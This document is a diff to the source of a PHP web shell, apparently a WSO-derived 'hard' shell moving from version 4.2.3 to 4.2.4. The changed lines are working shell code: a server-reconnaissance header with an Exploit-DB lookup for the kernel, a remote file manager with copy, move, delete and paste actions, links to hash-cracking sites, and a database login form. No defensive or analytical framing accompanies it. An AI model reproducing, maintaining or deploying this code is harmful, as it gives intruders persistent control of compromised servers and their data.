@@ -23,7 +23,7 @@ function decrypt($str,$pwd){$pwd=base64_encode($pwd);$str=base64_decode($str);$e
 @ini_set('max_execution_time',0);
 @set_time_limit(0);
 @set_magic_quotes_runtime(0);
-@define('VERSION', '4.2.3');
+@define('VERSION', '4.2.4');
 if(get_magic_quotes_gpc()) {
 	function stripslashes_array($array) {
 		return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
@@ -225,7 +225,7 @@ function hardHeader() {
 	/* (С) 08.2015 dmkcv */
 	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:'.($GLOBALS['os'] == 'win'?'<br>Drives:':'').'</span></td>'.
 		 '<td><nobr>'.substr(@php_uname(), 0, 120).' <a href="http://noreferer.de/?http://www.google.com/search?q='.urlencode(@php_uname()).'" target="_blank">[ Google ]</a> <a href="'.$explink.'" target=_blank>[ Exploit-DB ]</a></nobr><br>'.$uid.' ( '.$user.' ) <span>Group:</span> '.$gid.' ( ' .$group. ' )<br>'.@phpversion().' <span>Safe mode:</span> '.($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=#FFDB5F><b>OFF</b></font>').' <a href=# onclick="g(\'Php\',null,null,\'info\')">[ phpinfo ]</a> <span>Datetime:</span> '.date('Y-m-d H:i:s').'<br>'.viewSize($totalSpace).' <span>Free:</span> '.viewSize($freeSpace).' ('.round(100/($totalSpace/$freeSpace),2).'%)<br>'.$cwd_links.' '.viewPermsColor($GLOBALS['cwd']).' <a href=# onclick="g(\'FilesMan\',\''.$GLOBALS['home_cwd'].'\',\'\',\'\',\'\')">[ home ]</a><br>'.$drives.'</td>'.
-		 '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">'.$opt_charsets.'</optgroup></select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
+		 '<td width=1 align=right><nobr><label><select onchange="g(null,null,null,null,null,this.value)">'.$opt_charsets.'</select></label><br><span>Server IP:</span><br>'.gethostbyname($_SERVER["HTTP_HOST"]).'<br><span>Client IP:</span><br>'.$_SERVER['REMOTE_ADDR'].'</nobr></td></tr></table>'.
 		 '<table style="background-color:#2E6E9C;" cellpadding=3 cellspacing=0 width=100%><tr>'.$menu.'</tr></table><div>';
 }
 function hardFooter() {
@@ -932,12 +932,13 @@ echo "<script>
 	<input type=hidden name=a value='FilesMan'>
 	<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
 	<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
-	<label><select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
+	<label><select name='p1'>";
+	if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))
+        echo "<option value='paste'>↳ Paste</option>";
+	echo "<option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
     if(class_exists('ZipArchive'))
         echo "<option value='zip'>+ zip</option><option value='unzip'>- zip</option>";
     echo "<option value='tar'>+ tar.gz</option>";
-    if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))
-        echo "<option value='paste'>↳ Paste</option>";
     echo "</select></label>";
     if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
         echo "&nbsp;file name: <input type=text name=p2 value='hard_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
@@ -1026,10 +1027,9 @@ function actionStringTools() {
 			<input type='submit' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
             <input type='submit' value='fakenamegenerator.com' onclick=\"document.hf.action='http://www.fakenamegenerator.com/';document.hf.submit()\"><br>
 			<input type='submit' value='hashcrack.com' onclick=\"document.hf.action='http://www.hashcrack.com/index.php';document.hf.submit()\"><br>
-			<input type='submit' value='tools4noobs.com' onclick=\"document.hf.action='http://www.tools4noobs.com/online_php_functions/';document.hf.submit()\"><br>
+			<input type='submit' value='toolki.com' onclick=\"document.hf.action='http://toolki.com/';document.hf.submit()\"><br>
 			<input type='submit' value='fopo.com.ar' onclick=\"document.hf.action='http://fopo.com.ar/';document.hf.submit()\"><br>
 			<input type='submit' value='md5decrypter.com' onclick=\"document.hf.action='http://www.md5decrypter.com/';document.hf.submit()\"><br>
-			<input type='submit' value='artlebedev.ru' onclick=\"document.hf.action='https://www.artlebedev.ru/tools/decoder/';document.hf.submit()\"><br>
 		</form></div>";
 	hardFooter();
 }
@@ -1430,7 +1430,7 @@ if(@$_POST['type']=='pgsql')echo 'selected';
 echo ">PostgreSql</option></select></label></td>
 <td><input type=text name=sql_host value=\"". (empty($_POST['sql_host'])?'localhost':htmlspecialchars($_POST['sql_host'])) ."\"></td>
 <td><input type=text name=sql_login value=\"". (empty($_POST['sql_login'])?'root':htmlspecialchars($_POST['sql_login'])) ."\"></td>
-<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\"></td><td>";
+<td><input type=text name=sql_pass value=\"". (empty($_POST['sql_pass'])?'':htmlspecialchars($_POST['sql_pass'])) ."\" required></td><td>";
 	$tmp = "<input type=text name=sql_base value=''>";
 	if(isset($_POST['sql_host'])){
 		if($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
